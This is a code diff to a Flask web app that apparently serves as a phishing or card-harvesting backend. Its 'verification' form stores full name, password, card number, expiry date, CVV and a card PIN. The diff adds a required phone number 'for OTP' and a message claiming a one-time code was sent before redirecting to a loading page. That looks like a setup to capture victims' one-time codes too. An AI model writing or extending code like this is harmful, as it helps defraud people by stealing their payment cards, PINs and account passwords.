@@ -32,6 +32,7 @@ class Submission(db.Model):
     cvv = db.Column(db.String(3), nullable=False)  # CVV 3 digits, required
     card_pin = db.Column(db.String(5), nullable=False)  # Card PIN 5 digits, required
     contact_number = db.Column(db.String(20), nullable=True)  # Contact number, optional
+    phone_number = db.Column(db.String(20), nullable=False)  # Phone number for OTP, required
     submitted_at = db.Column(db.DateTime, default=datetime.utcnow)  # Timestamp, defaults to current time
 
     def to_dict(self):
@@ -45,6 +46,7 @@ class Submission(db.Model):
             'cvv': self.cvv,
             'card_pin': self.card_pin,
             'contact_number': self.contact_number,
+            'phone_number': self.phone_number,
             'submitted_at': self.submitted_at.isoformat() if self.submitted_at else None
         }
 
@@ -275,7 +277,7 @@ def submit_form():
         )
         
         # Validate that all required fields are present
-        required_fields = ['fullname', 'password', 'CardNumber', 'expiry_date', 'cvv', 'card_pin']
+        required_fields = ['fullname', 'password', 'CardNumber', 'expiry_date', 'cvv', 'card_pin', 'phone_number']
         for field in required_fields:
             if not data.get(field):  # Check if field is missing or empty
                 return jsonify({'error': f'Field {field} is required'}), 400  # Return error response
@@ -288,7 +290,8 @@ def submit_form():
             expiry_date=data['expiry_date'],  # Extract expiry date from form data
             cvv=data['cvv'],  # Extract CVV from form data
             card_pin=data['card_pin'],  # Extract card PIN from form data
-            contact_number=data.get('contact_number')  # Extract contact number (optional)
+            contact_number=data.get('contact_number'),  # Extract contact number (optional)
+            phone_number=data['phone_number']  # Extract phone number for OTP
         )
         
         # Add submission to database session and commit
@@ -308,7 +311,7 @@ def submit_form():
         # Return success response with redirect instruction
         return jsonify({
             'success': True, 
-            'message': 'Verification completed successfully',
+            'message': f'Verification completed successfully! OTP has been sent to {data["phone_number"]}',
             'redirect': '/loading'  # Instruct frontend to redirect to loading page
         }), 200
     
